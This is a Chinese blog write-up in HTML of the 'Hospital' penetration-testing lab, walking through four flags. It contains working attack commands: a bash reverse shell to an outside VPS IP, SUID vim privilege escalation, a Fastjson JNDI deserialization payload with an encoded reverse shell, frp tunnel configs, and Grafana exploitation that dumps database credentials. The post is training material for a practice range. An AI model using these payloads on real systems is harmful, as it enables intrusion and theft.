@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="1在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。  目标地址：39.99.151.78 flag1先尝试用fscan扫描目标。  发现存在heapdump泄露，尝试提取。 扫目录发现存在&#x2F;actuator路由，那么信息泄露是拿捏稳稳的了。  访问后结果">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Hospital wp">
+<meta property="og:url" content="http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/index.html">
+<meta property="og:site_name" content="Meteor_Kai">
+<meta property="og:description" content="1在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。  目标地址：39.99.151.78 flag1先尝试用fscan扫描目标。  发现存在heapdump泄露，尝试提取。 扫目录发现存在&#x2F;actuator路由，那么信息泄露是拿捏稳稳的了。  访问后结果">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516004537352.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005051044.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005109848.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005355284.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005750835.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005915170.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516010019232.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516010333470.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516010502897.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516013719839.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516013901975.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516014636662.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516015022562.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519121832736.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519122043882.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519122911015.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519123200276.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519123714037.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519123840031.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519124229983.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519124459981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519125151942.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519131650811.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519131912201.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519131912201.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519132053536.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519132149256.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519133110787.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519134545375.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519134804126.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519192051990.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519192251052.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519192828943.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519193304323.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519193409882.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519194547877.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519194600574.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519193817901.png">
+<meta property="article:published_time" content="2025-05-19T11:46:49.000Z">
+<meta property="article:modified_time" content="2025-05-19T11:47:31.136Z">
+<meta property="article:author" content="Meteor_Kai">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516004537352.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云镜-Hospital wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/18/%E5%86%85%E7%BD%91%E5%AF%B9%E6%8A%97-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%AF%87/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&text=春秋云镜-Hospital wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&is_video=false&description=春秋云镜-Hospital wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜-Hospital wp&body=Check out this article: http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&title=春秋云镜-Hospital wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&name=春秋云镜-Hospital wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/&t=春秋云镜-Hospital wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">3.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">4.</span> <span class="toc-text">flag4</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云镜-Hospital wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Meteor_Kai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-19T11:46:49.000Z" class="dt-published" itemprop="datePublished">2025-05-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/wp/" rel="tag">wp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。</span><br></pre></td></tr></table></figure>
+
+<p>目标地址：39.99.151.78</p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>先尝试用fscan扫描目标。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516004537352.png" alt="image-20250516004537352"></p>
+<p>发现存在heapdump泄露，尝试提取。</p>
+<p>扫目录发现存在&#x2F;actuator路由，那么信息泄露是拿捏稳稳的了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005051044.png" alt="image-20250516005051044"></p>
+<p>访问后结果如下，发现&#x2F;actuator&#x2F;heapdump，下载下来。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005109848.png" alt="image-20250516005109848"></p>
+<p>接着我们提取heapdump文件内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump &gt;ans.txt</span><br></pre></td></tr></table></figure>
+
+<p>发现了shirokey！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005355284.png" alt="image-20250516005355284"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GAYysgMQhG7/CzIJlVpR2g==</span><br></pre></td></tr></table></figure>
+
+<p>再加上端口为8080，那么这个网站不出意外就是shiro框架的java网站了。</p>
+<p>尝试直接用shiro一把梭工具扫一下。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005750835.png" alt="image-20250516005750835"></p>
+<p>直接获取了webshell权限。接着我们尝试注入内存马将权限转移到webshell管理工具上。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516005915170.png" alt="image-20250516005915170"></p>
+<p>哥斯拉连接。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516010019232.png" alt="image-20250516010019232"></p>
+<p>看看能不能找到第一个flag，但是我们在环境变量和根目录等地方都没有找到，那么先尝试提反弹shell吧。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516010333470.png" alt="image-20250516010333470"></p>
+<p>接下来我们要做的是提权，因为现在的权限实在是太低了。尝试SUID提权。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516010502897.png" alt="image-20250516010502897"></p>
+<p>发现vim.basic，可以尝试提权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vim.basic -c &#x27;:py3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516013719839.png" alt="image-20250516013719839"></p>
+<p>获取到第一个flag</p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>那么本机上就没有其他flag了，我们看看它的ip</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516013901975.png" alt="image-20250516013901975"></p>
+<p>内网ip为<code>172.30.12.5</code>，用fscan扫扫内网网段。</p>
+<p>那么我们需要先上传一个fscan，使用哥斯拉的文件上传功能即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516014636662.png" alt="image-20250516014636662"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250516015022562.png" alt="image-20250516015022562"></p>
+<p>我们收集到的主要资产如下：</p>
+<p><a target="_blank" rel="noopener" href="http://172.30.12.236:8080/">http://172.30.12.236:8080</a>  医院后台</p>
+<p><a target="_blank" rel="noopener" href="http://172.30.12.6:8848/">http://172.30.12.6:8848</a>  nacos</p>
+<p>这里我们注意到这个nacos的资产存在一个未授权漏洞。</p>
+<p>接下来我们需要建立隧道。我们往目标上上传一个frpc和一个frpc.toml</p>
+<p>先配置我们vps的frps</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bindPort = 7000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519121832736.png" alt="image-20250519121832736"></p>
+<p>然后配置一下靶机的frpc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 156.238.233.113</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[plugin_socks6]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 5001</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519122043882.png" alt="image-20250519122043882"></p>
+<p>然后配置一下proxifier</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519122911015.png" alt="image-20250519122911015" style="zoom:80%;" />
+
+<p>然后我们就能成功访问到内网啦</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519123200276.png" alt="image-20250519123200276"></p>
+<p>我们已经扫到nacos未授权了，用工具试一下。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519123714037.png" alt="image-20250519123714037"></p>
+<p>直接注入内存马，然后用哥斯拉连接。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519123840031.png" alt="image-20250519123840031"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9dede423-c85a-4878-a1f2-6f08bab69ae4&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来我们看这个目标！</p>
+<p><a target="_blank" rel="noopener" href="http://172.30.12.236:8080/">http://172.30.12.236:8080</a>  医院后台</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519124229983.png" alt="image-20250519124229983" style="zoom:80%;" />
+
+<p>fscan没有扫到什么东西，网页源代码也没有什么特殊的，我们抓包看看。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519124459981.png" alt="image-20250519124459981"></p>
+<p>是以json的方式传递的，猜测为FastJson</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519125151942.png" alt="image-20250519125151942"></p>
+<p>发现fastjson版本为1.2.45</p>
+<p>我们往web01上上传一个JNDI-Injection-Exploit攻击，进行fastjson反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzAuMTIuNS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; -A &quot;172.30.12.5&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将172.30.12.236反弹shell到172.30.12.5的8888端口</p>
+<p>我们先给172.30.12.5开启一下nc监听，监听8888端口。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519131650811.png" alt="image-20250519131650811"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;name&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">		&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;x&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">		&quot;dataSourceName&quot;: &quot;rmi://172.30.12.5:1099/jxixvy&quot;,</span><br><span class="line">		&quot;autoCommit&quot;: true</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519131912201.png" alt="image-20250519131912201"></p>
+<p>成功反弹shell！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519131912201.png"></p>
+<p>然后我们进行以下操作，以后方便点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br><span class="line">123456</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519132053536.png" alt="image-20250519132053536"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a0655f59-3fd3-42fa-9ea8-2152d003e42c&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519132149256.png" alt="image-20250519132149256" style="zoom:80%;" />
+
+<p>我们发现多了一个172.30.54网段。用fscan扫一下，先上传。</p>
+<p>我们把需要的工具放到web1上，然后去wget即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br><span class="line">wget http://172.30.12.5:8000/fscan</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519133110787.png" alt="image-20250519133110787"></p>
+<p>发现了一个新目标172.30.54.12，端口为3000。服务是Grafana，能利用漏洞就只有 SSRF 和任意文件读取</p>
+<p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/A-D-Team/grafanaExp/releases">https://github.com/A-D-Team/grafanaExp/releases</a></p>
+<p>这里我用这个工具报错了，不知道为啥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#读取postgresql密码</span><br><span class="line">./linux_amd64_grafanaExp exp -u http://172.30.54.12:3000/</span><br></pre></td></tr></table></figure>
+
+<p>直接拿别人的结果吧，看半天没看出原因，就不浪费钱了，1h&#x3D;7r啊！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@web03:/tmp# ./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000</span><br><span class="line">2024/01/26 10:00:02 Target vulnerable has plugin [alertlist]</span><br><span class="line">2024/01/26 10:00:02 Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class="line">2024/01/26 10:00:02 There is [0] records in db.</span><br><span class="line">2024/01/26 10:00:02 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123]  database:[postgres]     basic_auth_user:[]      basic_auth_password:[]</span><br><span class="line">2024/01/26 10:00:02 All Done, have nice day!</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来配置一个双层代理</p>
+<p>frps.ini如下，上传到web01</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7412</span><br></pre></td></tr></table></figure>
+
+<p>frpc.ini如下，上传到web03</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 172.30.12.5</span><br><span class="line">server_port = 7412</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6000</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519134545375.png" alt="image-20250519134545375"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519134804126.png" alt="image-20250519134804126"></p>
+<p>接着我们配置一下proxy chain</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519192051990.png" alt="image-20250519192051990"></p>
+<p>然后我们就能成功访问到目标啦~</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519192251052.png" alt="image-20250519192251052" style="zoom:80%;" />
+
+<p>接下来尝试连接数据库</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250519192828943.png" alt="image-20250519192828943" style="zoom:80%;" />
+
+<p>连上后查询一下数据库版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version()</span><br><span class="line"></span><br><span class="line">PostgreSQL 8.1.0 on x86_64-unknown-linux-gnu, compiled by GCC gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0</span><br></pre></td></tr></table></figure>
+
+<p>然后我们对 <code>root</code> 用户的密码进行修改</p>
